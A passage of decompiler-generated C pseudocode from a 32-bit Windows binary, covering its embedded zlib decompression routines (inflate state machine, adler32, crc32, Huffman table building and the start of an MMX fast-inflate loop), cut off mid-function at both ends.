                  --v196;
                  v135 = v134 << v6;
                  v6 += 8;
                  v132 = *(v4 + 72);
                  v5 += v135;
                  v133 = Src + 1;
                  v194 = v5;
                  Src = Src + 1;
                }
                while ( v6 < v132 );
              }
              v6 -= v132;
              v193 = v6;
              v136 = v5 & ((1 << v132) - 1);
              v5 >>= v132;
              *(v4 + 68) += v136;
              *(v4 + 7108) += v132;
              v194 = v5;
            }
            *v4 = 24;
LABEL_293:
            if ( !Size )
              goto LABEL_343;
            v137 = *(v4 + 68);
            if ( v137 > v185 - Size )
            {
              v138 = v137 - (v185 - Size);
              if ( v138 > *(v4 + 44) && *(v4 + 7104) )
              {
                *(v9 + 24) = "invalid distance too far back";
                goto LABEL_25;
              }
              v139 = *(v4 + 52);
              if ( v138 <= *(v4 + 48) )
              {
                v140 = *(v4 + 48) + v139 - v138;
              }
              else
              {
                v138 -= *(v4 + 48);
                v140 = *(v4 + 40) + v139 - v138;
              }
              v175 = v140;
              v141 = *(v4 + 64);
              if ( v138 > v141 )
LABEL_304:
                v138 = v141;
              if ( v138 > Size )
                v138 = Size;
              Size -= v138;
              *(v4 + 64) = v141 - v138;
              v142 = Dst;
              do
              {
                *v142 = v142[v175 - Dst];
                ++v142;
                --v138;
              }
              while ( v138 );
              v9 = a3;
              Dst = v142;
              v4 = v186;
              if ( !v186[16] )
                *v186 = 20;
              goto LABEL_139;
            }
            v175 = &Dst[-v137];
            v141 = *(v4 + 64);
            goto LABEL_304;
          }
          *(v9 + 24) = "invalid distances set";
LABEL_204:
          *v4 = 29;
LABEL_138:
          v5 = v194;
LABEL_139:
          v7 = v196;
LABEL_140:
          v8 = *v4;
          if ( *v4 > 0x1Eu )
            return -2;
          continue;
        }
        if ( v6 >= 3 )
        {
LABEL_197:
          v88 = *(v4 + 104);
          v89 = v5 & 7;
          v5 >>= 3;
          v194 = v5;
          *(v4 + 2 * word_681FDB50[v88] + 112) = v89;
          ++*(v4 + 104);
          v6 -= 3;
          v7 = v196;
          v193 = v6;
          goto LABEL_198;
        }
        v85 = Src;
        while ( v7 )
        {
          v86 = *v85;
          v196 = v7 - 1;
          v87 = v86 << v6;
          v6 += 8;
          --v7;
          v5 += v87;
          v85 = Src + 1;
          v194 = v5;
          Src = Src + 1;
          if ( v6 >= 3 )
            goto LABEL_197;
        }
LABEL_343:
        v7 = v196;
LABEL_344:
        *(a3 + 12) = Dst;
        v155 = Src;
        *(a3 + 16) = Size;
        v156 = 0;
        *a3 = v155;
        v157 = v194;
        *(a3 + 4) = v7;
        *(v4 + 60) = v6;
        *(v4 + 56) = v157;
        if ( !*(v4 + 40) && (v185 == *(a3 + 16) || *v4 >= 29 || *v4 >= 26 && a4 == 4) )
        {
LABEL_353:
          v158 = v167 - *(a3 + 4);
          v159 = v185 - *(a3 + 16);
          *(a3 + 8) += v158;
          *(a3 + 20) += v159;
          *(v4 + 28) += v159;
          v168 = v158;
          if ( *(v4 + 8) && v159 )
          {
            v165 = (*(a3 + 12) - v159);
            v163 = *(v4 + 24);
            if ( *(v4 + 16) )
              v160 = sub_681FBF51(v163, v165, v159);
            else
              v160 = sub_681FBD21(v163, v165, v159);
            *(v4 + 24) = v160;
            v156 = 0;
            *(a3 + 48) = v160;
          }
          if ( *v4 == 19 || *v4 == 14 )
            v156 = 256;
          v161 = 0;
          if ( *v4 == 11 )
            v161 = 128;
          *(a3 + 44) = *(v4 + 60) + v156 + (*(v4 + 4) != 0 ? 0x40 : 0) + v161;
          if ( (v168 || v159) && a4 != 4 )
            return v187;
          result = v187;
          if ( !v187 )
            result = -5;
          return result;
        }
        if ( !sub_681FBC5B(a3, *(a3 + 12), v185 - *(a3 + 16)) )
        {
          v156 = 0;
          goto LABEL_353;
        }
        *v4 = 30;
        return -4;
      case 17:
        goto LABEL_198;
      case 18:
        goto LABEL_232;
      case 19:
        goto LABEL_245;
      case 20:
        goto LABEL_246;
      case 21:
        goto LABEL_267;
      case 22:
        goto LABEL_274;
      case 23:
        goto LABEL_286;
      case 24:
        goto LABEL_293;
      case 25:
        if ( !Size )
          goto LABEL_343;
        v143 = Dst++;
        --Size;
        *v143 = *(v4 + 64);
        v9 = a3;
        *v4 = 20;
        goto LABEL_140;
      case 26:
        if ( !*(v4 + 8) )
          goto LABEL_328;
        if ( v6 >= 0x20 )
          goto LABEL_318;
        v144 = Src;
        do
        {
          if ( !v7 )
            goto LABEL_343;
          v145 = *v144;
          v196 = v7 - 1;
          v146 = v145 << v6;
          v6 += 8;
          --v7;
          v5 += v146;
          v144 = Src + 1;
          v194 = v5;
          Src = Src + 1;
          v193 = v6;
        }
        while ( v6 < 0x20 );
LABEL_318:
        v147 = Size;
        v148 = v185 - Size;
        *(v9 + 20) += v185 - Size;
        *(v4 + 28) += v185 - Size;
        if ( v185 != Size )
        {
          v164 = &Dst[-v148];
          v162 = *(v4 + 24);
          if ( *(v4 + 16) )
            v149 = sub_681FBF51(v162, v164, v148);
          else
            v149 = sub_681FBD21(v162, v164, v148);
          v5 = v194;
          *(v4 + 24) = v149;
          *(v9 + 48) = v149;
          v147 = Size;
        }
        v185 = v147;
        v150 = (v5 >> 24) + ((v5 >> 8) & 0xFF00) + (((v5 << 16) + (v5 & 0xFF00)) << 8);
        if ( *(v4 + 16) )
          v150 = v5;
        v15 = v150 == *(v4 + 24);
        v7 = v196;
        if ( v15 )
        {
          v5 = 0;
          v6 = 0;
          v194 = 0;
          v193 = 0;
LABEL_328:
          *v4 = 27;
LABEL_329:
          if ( *(v4 + 8) && *(v4 + 16) )
          {
            if ( v6 < 0x20 )
            {
              v151 = Src;
              do
              {
                if ( !v7 )
                  goto LABEL_343;
                v152 = *v151;
                v196 = v7 - 1;
                v153 = v152 << v6;
                v6 += 8;
                --v7;
                v5 += v153;
                v151 = Src + 1;
                v194 = v5;
                Src = Src + 1;
                v193 = v6;
              }
              while ( v6 < 0x20 );
            }
            if ( v5 != *(v4 + 28) )
            {
              *(v9 + 24) = "incorrect length check";
              goto LABEL_25;
            }
            v194 = 0;
            v6 = 0;
          }
          *v4 = 28;
LABEL_340:
          v154 = 1;
LABEL_342:
          v187 = v154;
          goto LABEL_343;
        }
        *(v9 + 24) = "incorrect data check";
        goto LABEL_39;
      case 27:
        goto LABEL_329;
      case 28:
        goto LABEL_340;
      case 29:
        v154 = -3;
        goto LABEL_342;
      case 30:
        return -4;
      default:
        return -2;
    }
  }
}

//----- (681FBA60) --------------------------------------------------------
signed int __stdcall sub_681FBA60(int a1)
{
  int v1; // eax
  void (__cdecl *v2)(_DWORD, _DWORD); // ecx

  if ( !a1 )
    return -2;
  v1 = *(a1 + 28);
  if ( !v1 )
    return -2;
  v2 = *(a1 + 36);
  if ( !v2 )
    return -2;
  if ( *(v1 + 52) )
    v2(*(a1 + 40), *(v1 + 52));
  (*(a1 + 36))(*(a1 + 40), *(a1 + 28));
  *(a1 + 28) = 0;
  return 0;
}

//----- (681FBAA4) --------------------------------------------------------
signed int __stdcall sub_681FBAA4(int a1, signed int a2, _BYTE *a3, int a4)
{
  int v4; // eax
  int v5; // edi
  signed int v6; // ebx

  if ( !a3 || *a3 != 49 || a4 != 56 )
    return -6;
  if ( !a1 )
    return -2;
  *(a1 + 24) = 0;
  if ( !*(a1 + 32) )
  {
    *(a1 + 32) = ReturnMultipliedMalloc;
    *(a1 + 40) = 0;
  }
  if ( !*(a1 + 36) )
    *(a1 + 36) = FreeMemPtr;
  v4 = (*(a1 + 32))(*(a1 + 40), 1, 7116);
  v5 = v4;
  if ( !v4 )
    return -4;
  *(a1 + 28) = v4;
  *(v4 + 52) = 0;
  v6 = sub_681FBB48(a1, a2);
  if ( v6 )
  {
    (*(a1 + 36))(*(a1 + 40), v5);
    *(a1 + 28) = 0;
  }
  return v6;
}

//----- (681FBB31) --------------------------------------------------------
signed int __stdcall sub_681FBB31(int a1, _BYTE *a2, int a3)
{
  return sub_681FBAA4(a1, 15, a2, a3);
}

//----- (681FBB48) --------------------------------------------------------
signed int __stdcall sub_681FBB48(int a1, signed int a2)
{
  int v2; // edi
  _DWORD *v3; // ebx
  signed int v4; // esi
  int v6; // [esp+14h] [ebp+8h]

  v2 = a1;
  if ( !a1 )
    return -2;
  v3 = *(a1 + 28);
  if ( !v3 )
    return -2;
  v4 = a2;
  if ( a2 >= 0 )
  {
    v6 = (a2 >> 4) + 1;
    if ( a2 < 48 )
      v4 = a2 & 0xF;
  }
  else
  {
    v6 = 0;
    v4 = -a2;
  }
  if ( v4 && (v4 < 8 || v4 > 15) )
    return -2;
  if ( v3[13] )
  {
    if ( v3[9] != v4 )
    {
      (*(v2 + 36))(*(v2 + 40), v3[13]);
      v3[13] = 0;
    }
  }
  v3[2] = v6;
  v3[9] = v4;
  return sub_681FBBBF(v2);
}

//----- (681FBBBF) --------------------------------------------------------
signed int __stdcall sub_681FBBBF(int a1)
{
  _DWORD *v1; // ecx

  if ( !a1 )
    return -2;
  v1 = *(a1 + 28);
  if ( !v1 )
    return -2;
  v1[10] = 0;
  v1[11] = 0;
  v1[12] = 0;
  return sub_681FBBEA(a1);
}

//----- (681FBBEA) --------------------------------------------------------
signed int __stdcall sub_681FBBEA(int a1)
{
  _DWORD *v1; // ecx
  int v2; // edx
  signed int result; // eax

  if ( !a1 )
    return -2;
  v1 = *(a1 + 28);
  if ( !v1 )
    return -2;
  v1[7] = 0;
  *(a1 + 20) = 0;
  *(a1 + 8) = 0;
  *(a1 + 24) = 0;
  v2 = v1[2];
  if ( v2 )
    *(a1 + 48) = v1[2] & 1;
  v1[1777] = -1;
  *v1 = 0;
  v1[1] = 0;
  v1[3] = 0;
  v1[8] = 0;
  v1[14] = 0;
  v1[15] = 0;
  v1[27] = v1 + 332;
  v1[20] = v1 + 332;
  v1[19] = v1 + 332;
  result = 0;
  v1[5] = 0x8000;
  v1[1776] = 1;
  return result;
}

//----- (681FBC5B) --------------------------------------------------------
int __cdecl sub_681FBC5B(int a1, int a2, size_t Size)
{
  int v3; // esi
  int v4; // eax
  size_t v6; // edi
  int v7; // eax
  unsigned int v8; // edi
  size_t v9; // ebx
  unsigned int v10; // ecx
  unsigned int v11; // eax

  v3 = *(a1 + 28);
  if ( !*(v3 + 52) )
  {
    v4 = (*(a1 + 32))(*(a1 + 40), 1 << *(v3 + 36), 1);
    *(v3 + 52) = v4;
    if ( !v4 )
      return 1;
  }
  if ( !*(v3 + 40) )
  {
    *(v3 + 40) = 1 << *(v3 + 36);
    *(v3 + 48) = 0;
    *(v3 + 44) = 0;
  }
  v6 = *(v3 + 40);
  if ( Size >= v6 )
  {
    memcpy(*(v3 + 52), (a2 - v6), *(v3 + 40));
    *(v3 + 48) = 0;
LABEL_8:
    v7 = *(v3 + 40);
    goto LABEL_17;
  }
  v8 = v6 - *(v3 + 48);
  if ( v8 > Size )
    v8 = Size;
  memcpy((*(v3 + 48) + *(v3 + 52)), (a2 - Size), v8);
  v9 = Size - v8;
  if ( Size != v8 )
  {
    memcpy(*(v3 + 52), (a2 - v9), v9);
    *(v3 + 48) = v9;
    goto LABEL_8;
  }
  *(v3 + 48) += v8;
  v10 = *(v3 + 40);
  if ( *(v3 + 48) == v10 )
    *(v3 + 48) = 0;
  v11 = *(v3 + 44);
  if ( v11 >= v10 )
    return 0;
  v7 = v8 + v11;
LABEL_17:
  *(v3 + 44) = v7;
  return 0;
}

//----- (681FBD21) --------------------------------------------------------
unsigned int __stdcall sub_681FBD21(unsigned int a1, _BYTE *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  unsigned int result; // eax
  unsigned int v5; // esi
  unsigned int v6; // edi
  unsigned __int8 *v7; // ecx
  signed int v8; // edx
  _BYTE *v9; // ebx
  int v10; // esi
  int v11; // ecx
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // edi
  int v17; // esi
  int v18; // edi
  int v19; // esi
  int v20; // edi
  int v21; // esi
  int v22; // edi
  int v23; // esi
  int v24; // edi
  int v25; // esi
  int v26; // edi
  int v27; // esi
  int v28; // edi
  int v29; // esi
  int v30; // edi
  int v31; // esi
  int v32; // edi
  int v33; // esi
  int v34; // edi
  int v35; // esi
  int v36; // edi
  int v37; // esi
  int v38; // eax
  int v39; // edi
  int v40; // esi
  int v41; // edi
  bool v42; // zf
  unsigned int v43; // edx
  int v44; // esi
  int v45; // edi
  int v46; // esi
  int v47; // edi
  int v48; // esi
  int v49; // edi
  int v50; // esi
  int v51; // edi
  int v52; // esi
  int v53; // edi
  int v54; // esi
  int v55; // edi
  int v56; // esi
  int v57; // edi
  int v58; // esi
  int v59; // edi
  int v60; // esi
  int v61; // edi
  int v62; // esi
  int v63; // edi
  int v64; // esi
  int v65; // edi
  int v66; // esi
  int v67; // edi
  int v68; // esi
  int v69; // edi
  int v70; // esi
  int v71; // edi
  int v72; // esi
  int v73; // eax
  int v74; // edi
  unsigned int v75; // [esp+14h] [ebp+8h]
  int v76; // [esp+1Ch] [ebp+10h]

  v3 = a3;
  result = 1;
  v5 = a1;
  v6 = a1 >> 16;
  if ( a3 == 1 )
  {
    v5 = *a2 + a1;
    if ( v5 >= 0xFFF1 )
      v5 -= 65521;
    v6 += v5;
    if ( v6 >= 0xFFF1 )
      v6 -= 65521;
    return v5 | (v6 << 16);
  }
  v7 = a2;
  if ( !a2 )
    return result;
  if ( a3 >= 0x10 )
  {
    if ( a3 >= 0x15B0 )
    {
      v75 = a3 / 0x15B0;
      do
      {
        v8 = 347;
        v76 = v3 - 5552;
        v9 = a2;
        do
        {
          v10 = *v9 + v5;
          v11 = v9[15];
          v12 = v10 + v6;
          v13 = v9[1] + v10;
          v14 = v13 + v12;
          v15 = v9[2] + v13;
          v16 = v15 + v14;
          v17 = v9[3] + v15;
          v18 = v17 + v16;
          v19 = v9[4] + v17;
          v20 = v19 + v18;
          v21 = v9[5] + v19;
          v22 = v21 + v20;
          v23 = v9[6] + v21;
          v24 = v23 + v22;
          v25 = v9[7] + v23;
          v26 = v25 + v24;
          v27 = v9[8] + v25;
          v28 = v27 + v26;
          v29 = v9[9] + v27;
          v30 = v29 + v28;
          v31 = v9[10] + v29;
          v32 = v31 + v30;
          v33 = v9[11] + v31;
          v34 = v33 + v32;
          v35 = v9[12] + v33;
          v36 = v35 + v34;
          v37 = v9[13] + v35;
          v38 = v9[14];
          v39 = v37 + v36;
          v9 += 16;
          v40 = v38 + v37;
          v41 = v40 + v39;
          v5 = v11 + v40;
          v6 = v5 + v41;
          --v8;
        }
        while ( v8 );
        a2 = v9;
        v3 = v76;
        v5 %= 0xFFF1u;
        v42 = v75-- == 1;
        v6 %= 0xFFF1u;
      }
      while ( !v42 );
      v7 = a2;
    }
    if ( v3 )
    {
      if ( v3 >= 0x10 )
      {
        v43 = v3 >> 4;
        do
        {
          v3 -= 16;
          v44 = *v7 + v5;
          v45 = v44 + v6;
          v46 = v7[1] + v44;
          v47 = v46 + v45;
          v48 = v7[2] + v46;
          v49 = v48 + v47;
          v50 = v7[3] + v48;
          v51 = v50 + v49;
          v52 = v7[4] + v50;
          v53 = v52 + v51;
          v54 = v7[5] + v52;
          v55 = v54 + v53;
          v56 = v7[6] + v54;
          v57 = v56 + v55;
          v58 = v7[7] + v56;
          v59 = v58 + v57;
          v60 = v7[8] + v58;
          v61 = v60 + v59;
          v62 = v7[9] + v60;
          v63 = v62 + v61;
          v64 = v7[10] + v62;
          v65 = v64 + v63;
          v66 = v7[11] + v64;
          v67 = v66 + v65;
          v68 = v7[12] + v66;
          v69 = v68 + v67;
          v70 = v7[13] + v68;
          v71 = v70 + v69;
          v72 = v7[14] + v70;
          v73 = v7[15];
          v74 = v72 + v71;
          v7 += 16;
          v5 = v73 + v72;
          v6 = v5 + v74;
          --v43;
        }
        while ( v43 );
      }
      for ( ; v3; --v3 )
      {
        v5 += *v7++;
        v6 += v5;
      }
      v5 %= 0xFFF1u;
      v6 %= 0xFFF1u;
    }
    return v5 | (v6 << 16);
  }
  if ( a3 )
  {
    do
    {
      v5 += *v7++;
      v6 += v5;
      --v3;
    }
    while ( v3 );
  }
  if ( v5 >= 0xFFF1 )
    v5 -= 65521;
  return v5 | (v6 % 0xFFF1 << 16);
}

//----- (681FBF51) --------------------------------------------------------
unsigned int __stdcall sub_681FBF51(int a1, int a2, int a3)
{
  unsigned int result; // eax

  if ( a2 )
    result = sub_681FBF73(a1, a2, a3);
  else
    result = 0;
  return result;
}

//----- (681FBF73) --------------------------------------------------------
unsigned int __cdecl sub_681FBF73(int a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // ecx
  unsigned int v4; // edi
  unsigned int v5; // ebx
  bool i; // zf
  unsigned int v7; // edx
  unsigned int v8; // ebx
  unsigned int v9; // edx
  unsigned int v10; // ebx
  unsigned int v11; // edx
  unsigned int v12; // ebx
  unsigned int v13; // edx
  _DWORD *v14; // esi
  unsigned int v15; // edx
  unsigned int v16; // ebx
  unsigned int v18; // [esp+14h] [ebp+8h]

  v3 = a2;
  v4 = a3;
  v5 = ~a1;
  for ( i = a3 == 0; !i && v3 & 3; i = v4 == 0 )
  {
    v5 = dword_681FDD60[(v5 ^ *v3++) & 0xFF] ^ (v5 >> 8);
    --v4;
  }
  if ( v4 < 0x20 )
  {
    v14 = v3;
  }
  else
  {
    v18 = v4 >> 5;
    while ( 1 )
    {
      v7 = *(v3 + 1) ^ dword_681FE960[(*v3 ^ v5)] ^ dword_681FDD60[(*v3 ^ v5) >> 24] ^ dword_681FE560[((*v3 ^ v5) >> 8) & 0xFF] ^ dword_681FE160[((*v3 ^ v5) >> 16) & 0xFF];
      v8 = *(v3 + 2) ^ dword_681FE960[v7] ^ dword_681FDD60[v7 >> 24] ^ dword_681FE560[v7 >> 8] ^ dword_681FE160[(v7 >> 16) & 0xFF];
      v9 = *(v3 + 3) ^ dword_681FE960[v8] ^ dword_681FDD60[v8 >> 24] ^ dword_681FE560[v8 >> 8] ^ dword_681FE160[(v8 >> 16) & 0xFF];
      v10 = *(v3 + 4) ^ dword_681FE960[v9] ^ dword_681FDD60[v9 >> 24] ^ dword_681FE560[v9 >> 8] ^ dword_681FE160[(v9 >> 16) & 0xFF];
      v11 = *(v3 + 5) ^ dword_681FE960[v10] ^ dword_681FDD60[v10 >> 24] ^ dword_681FE560[v10 >> 8] ^ dword_681FE160[(v10 >> 16) & 0xFF];
      v4 -= 32;
      v12 = *(v3 + 6) ^ dword_681FE960[v11] ^ dword_681FDD60[v11 >> 24] ^ dword_681FE560[v11 >> 8] ^ dword_681FE160[(v11 >> 16) & 0xFF];
      v13 = *(v3 + 7) ^ dword_681FE960[v12] ^ dword_681FDD60[v12 >> 24] ^ dword_681FE560[v12 >> 8] ^ dword_681FE160[(v12 >> 16) & 0xFF];
      v14 = v3 + 32;
      v5 = dword_681FE960[v13] ^ dword_681FDD60[v13 >> 24] ^ dword_681FE560[v13 >> 8] ^ dword_681FE160[(v13 >> 16) & 0xFF];
      if ( !--v18 )
        break;
      v3 += 32;
    }
  }
  if ( v4 >= 4 )
  {
    v15 = v4 >> 2;
    do
    {
      v16 = *v14 ^ v5;
      v4 -= 4;
      ++v14;
      v5 = dword_681FE960[v16] ^ dword_681FDD60[v16 >> 24] ^ dword_681FE560[v16 >> 8] ^ dword_681FE160[(v16 >> 16) & 0xFF];
      --v15;
    }
    while ( v15 );
  }
  for ( ; v4; --v4 )
  {
    v5 = dword_681FDD60[(v5 ^ *v14)] ^ (v5 >> 8);
    v14 = (v14 + 1);
  }
  return ~v5;
}

//----- (681FC223) --------------------------------------------------------
void *__cdecl ReturnMultipliedMalloc(int Unused, int X, int Y)
{
  return malloc(Y * X);
}

//----- (681FC236) --------------------------------------------------------
void __cdecl FreeMemPtr(int unused, void *Memory)
{
  free(Memory);
}

//----- (681FC244) --------------------------------------------------------
signed int __cdecl sub_681FC244(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, _WORD *a6)
{
  unsigned int i; // ecx
  unsigned int v7; // esi
  unsigned int v8; // ebx
  _DWORD **v9; // edx
  unsigned int v11; // edx
  int v12; // ecx
  unsigned int v13; // edi
  unsigned int v14; // ecx
  unsigned int v15; // ecx
  int v16; // eax
  _WORD *v17; // eax
  unsigned int v18; // edi
  unsigned int v19; // eax
  __int16 v20; // ax
  int v21; // ecx
  int v22; // ecx
  _DWORD *v23; // edi
  unsigned int j; // edi
  unsigned __int16 *v25; // eax
  bool v26; // zf
  int v27; // eax
  int v28; // eax
  char v29; // cl
  signed int v30; // edi
  unsigned int v31; // ebx
  __int16 *v32; // edx
  int v33; // edi
  unsigned int v34; // eax
  int v35; // edi
  __int16 v36; // [esp+Ch] [ebp-7Ch]
  __int16 v37[15]; // [esp+Eh] [ebp-7Ah]
  __int16 v38[16]; // [esp+2Ch] [ebp-5Ch]
  unsigned int v39; // [esp+4Ch] [ebp-3Ch]
  unsigned int v40; // [esp+50h] [ebp-38h]
  int v41; // [esp+54h] [ebp-34h]
  int v42; // [esp+58h] [ebp-30h]
  int v43; // [esp+5Ch] [ebp-2Ch]
  int v44; // [esp+60h] [ebp-28h]
  int v45; // [esp+64h] [ebp-24h]
  int v46; // [esp+68h] [ebp-20h]
  _WORD *v47; // [esp+6Ch] [ebp-1Ch]
  _BYTE *v48; // [esp+70h] [ebp-18h]
  unsigned int v49; // [esp+74h] [ebp-14h]
  int v50; // [esp+78h] [ebp-10h]
  int v51; // [esp+7Ch] [ebp-Ch]
  _DWORD *v52; // [esp+80h] [ebp-8h]
  int v53; // [esp+84h] [ebp-4h]
  int v54; // [esp+98h] [ebp+10h]
  unsigned __int16 v55; // [esp+98h] [ebp+10h]

  memset(v38, 0, sizeof(v38));
  for ( i = 0; i < a3; ++i )
    ++v38[*(a2 + 2 * i)];
  v7 = 15;
  v8 = *a5;
  do
  {
    if ( v38[v7] )
      break;
    --v7;
  }
  while ( v7 >= 1 );
  if ( v8 > v7 )
    v8 = v7;
  if ( !v7 )
  {
    v9 = a4;
    **a4 = 320;
    ++*v9;
    **a4 = 320;
    ++*v9;
    *a5 = 1;
    return 0;
  }
  v11 = 1;
  v50 = 1;
  if ( v7 > 1 )
  {
    do
    {
      if ( v38[v11] )
        break;
      ++v11;
    }
    while ( v11 < v7 );
    v50 = v11;
  }
  v12 = 1;
  v13 = 1;
  if ( v8 < v11 )
    v8 = v11;
  v39 = v8;
  do
  {
    v12 = 2 * v12 - v38[v13];
    if ( v12 < 0 )
      return -1;
    ++v13;
  }
  while ( v13 <= 0xF );
  if ( v12 > 0 && (!a1 || v7 != 1) )
    return -1;
  v37[0] = 0;
  v14 = 1;
  do
  {
    v37[v14] = v38[v14] + *(&v36 + v14 * 2);
    ++v14;
  }
  while ( v14 < 15 );
  v15 = 0;
  if ( a3 )
  {
    do
    {
      v16 = *(a2 + 2 * v15);
      if ( v16 )
      {
        a6[*(&v36 + v16)] = v15;
        ++*(&v36 + *(a2 + 2 * v15));
      }
      ++v15;
    }
    while ( v15 < a3 );
    v11 = v50;
  }
  v43 = -1;
  if ( a1 )
  {
    if ( a1 != 1 )
    {
      v47 = &unk_681FFEB8;
      v48 = &unk_681FFEF8;
      v51 = -1;
      goto LABEL_36;
    }
    v51 = 256;
    v47 = (&unk_681FFE38 - 514);
    v17 = (&unk_681FFE78 - 514);
  }
  else
  {
    v17 = a6;
    v47 = a6;
    v51 = 19;
  }
  v48 = v17;
LABEL_36:
  v18 = 0;
  v53 = 0;
  v49 = 0;
  v52 = *a4;
  v19 = 1 << v8;
  v46 = 1 << v8;
  v45 = 1 << v8;
  v41 = (1 << v8) - 1;
  if ( a1 == 1 && v19 > 0x354 || a1 == 2 && v19 > 0x250 )
    return 1;
  while ( 1 )
  {
    BYTE1(v54) = v11 - v53;
    v20 = *a6;
    v21 = *a6;
    if ( v21 >= v51 )
    {
      if ( v21 <= v51 )
      {
        LOBYTE(v54) = 96;
        v20 = 0;
      }
      else
      {
        LOBYTE(v54) = v48[2 * v21];
        v20 = v47[v21];
      }
    }
    else
    {
      LOBYTE(v54) = 0;
    }
    HIWORD(v54) = v20;
    v44 = 1 << (v11 - v53);
    v40 = v46;
    v42 = 4 * (1 << (v11 - v53));
    v22 = v46;
    v23 = &v52[v46 + (v18 >> v53)];
    do
    {
      v23 = (v23 - v42);
      *v23 = v54;
      v22 -= v44;
    }
    while ( v22 );
    for ( j = 1 << (v11 - 1); j & v49; j >>= 1 )
      ;
    if ( j )
    {
      v18 = (v49 & (j - 1)) + j;
      v49 = v18;
    }
    else
    {
      v18 = 0;
      v49 = 0;
    }
    v25 = a6 + 1;
    v26 = v38[v11]-- == 1;
    ++a6;
    if ( !v26 )
      goto LABEL_57;
    if ( v11 == v7 )
      break;
    v27 = *v25;
    v11 = *(a2 + 2 * v27);
    v50 = *(a2 + 2 * v27);
LABEL_57:
    if ( v11 > v8 )
    {
      v42 = v18 & v41;
      if ( (v18 & v41) != v43 )
      {
        v28 = v53;
        if ( !v53 )
          v28 = v8;
        v53 = v28;
        v52 += v40;
        v29 = v11 - v28;
        v30 = 1 << (v11 - v28);
        v40 = v11;
        if ( v11 < v7 )
        {
          v31 = v11;
          v32 = &v38[v11];
          do
          {
            v33 = v30 - *v32;
            if ( v33 <= 0 )
              break;
            ++v29;
            ++v32;
            ++v31;
            v30 = 2 * v33;
          }
          while ( v31 < v7 );
          v11 = v50;
          v8 = v39;
        }
        v34 = (1 << v29) + v45;
        v46 = 1 << v29;
        v45 += 1 << v29;
        if ( a1 == 1 && v34 > 0x354 || a1 == 2 && v34 > 0x250 )
          return 1;
        v35 = v42;
        v43 = v42;
        LOBYTE((*a4)[v42]) = v29;
        BYTE1((*a4)[v35]) = v8;
        HIWORD((*a4)[v35]) = v52 - *a4;
        v18 = v49;
      }
    }
  }
  if ( v18 )
  {
    LOBYTE(v55) = 64;
    HIBYTE(v55) = v11 - v53;
    v52[v18] = v55;
  }
  *a4 += v45;
  *a5 = v8;
  return 0;
}
// 681FC244: using guessed type __int16 var_5C[16];
// 681FC244: using guessed type __int16 var_7A[15];

//----- (681FC6D0) --------------------------------------------------------
int __usercall sub_681FC6D0@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4)
{
  unsigned int v4; // et0
  _DWORD *v5; // edi
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // ecx
  char *v10; // edx
  unsigned int v11; // ebp
  unsigned int v12; // ebx
  unsigned int *v13; // esi
  char *v14; // ecx
  unsigned int v15; // ecx
  int v16; // eax
  char *v17; // edi
  unsigned int v18; // et0
  unsigned int v19; // eax
  unsigned int v20; // et0
  unsigned __int16 v31; // ax
  char v32; // cl
  unsigned int i; // eax
  unsigned int v34; // edx
  unsigned __int8 v35; // cl
  unsigned __int8 v36; // ch
  unsigned __int16 v37; // ax
  char v38; // cl
  int v39; // eax
  unsigned __int16 v40; // ax
  char v41; // cl
  unsigned int j; // eax
  unsigned int v43; // edx
  unsigned __int8 v44; // cl
  unsigned __int8 v45; // ch
  unsigned __int16 v46; // ax
  char v47; // cl
  int v48; // eax
  int v49; // esi
  char v50; // al
  char v51; // dl
  char *v52; // edi
  char *v53; // edi
  char v54; // al
  unsigned int v55; // ecx
  char *v56; // esi
  unsigned int v57; // eax
  unsigned int v58; // ecx
  unsigned int v59; // ecx
  __m64 v60; // mm4
  __m64 v61; // mm3
  __m64 v62; // mm5
  __m64 v63; // mm2
  __m64 v64; // mm7
  __m64 v65; // mm7
  int v66; // eax
  unsigned int v67; // edx
  int v68; // eax
  __m64 v69; // mm7
  __m64 v70; // mm7
  int v71; // eax
  unsigned int k; // eax
  int v73; // eax
  unsigned int v74; // ecx
  char v75; // dl
  char *v76; // esi
  char *v77; // edi
  char *v78; // edi
  char v79; // al
  unsigned int v80; // ecx
  char *v81; // esi
  unsigned int v82; // ecx
  unsigned int v83; // ecx
  const char *v84; // ecx
  signed int v85; // edx
  int result; // eax
  int v87; // edx
  int v88; // esi
  int v89; // ebx
  char *v90; // [esp+4h] [ebp-64h]
  char *v91; // [esp+8h] [ebp-60h]
  unsigned int v92; // [esp+Ch] [ebp-5Ch]
  int v93; // [esp+10h] [ebp-58h]
  unsigned int v94; // [esp+14h] [ebp-54h]
  unsigned int v95; // [esp+18h] [ebp-50h]
  unsigned int v96; // [esp+1Ch] [ebp-4Ch]
  int v97; // [esp+20h] [ebp-48h]
  unsigned int v98; // [esp+24h] [ebp-44h]
  char *v99; // [esp+28h] [ebp-40h]
  unsigned int v100; // [esp+2Ch] [ebp-3Ch]
  char v101[12]; // [esp+30h] [ebp-38h]
  char *v102; // [esp+3Ch] [ebp-2Ch]
  unsigned int *v103; // [esp+40h] [ebp-28h]
  unsigned int v104; // [esp+44h] [ebp-24h]
  unsigned int v105; // [esp+48h] [ebp-20h]
  char *v106; // [esp+4Ch] [ebp-1Ch]
  char *v107; // [esp+50h] [ebp-18h]
  unsigned int v108; // [esp+54h] [ebp-14h]

  v4 = __readeflags();
  v108 = v4;
  v5 = *(a3 + 28);
  v6 = *a3 + *(a3 + 4) - 11;
  v103 = *a3;
  v99 = v6;
  v7 = *(a3 + 16);
  v107 = *(a3 + 12);
  v102 = &v107[v7 - a4];
  v98 = &v107[v7 - 257];
  v96 = v5[19];
  v97 = v5[20];
  v94 = (1 << v5[21]) - 1;
  v95 = (1 << v5[22]) - 1;
  v8 = v5[10];
  v9 = v5[12];
  v10 = v5[13];
  v105 = v5[10];
  v104 = v9;
  v106 = v10;
  v11 = v5[14];
  v12 = v5[15];
  v13 = v103;
  v14 = v99;
  if ( v99 > v103 )
  {
    while ( v13 & 3 )
    {
      v16 = *v13;
      v13 = (v13 + 1);
      v14 = v12;
      v12 += 8;
      v8 = v16 << v14;
      v11 |= v8;
    }
  }
  else
  {
    v15 = v99 + 11 - v103;
    qmemcpy(v101, v103, v15);
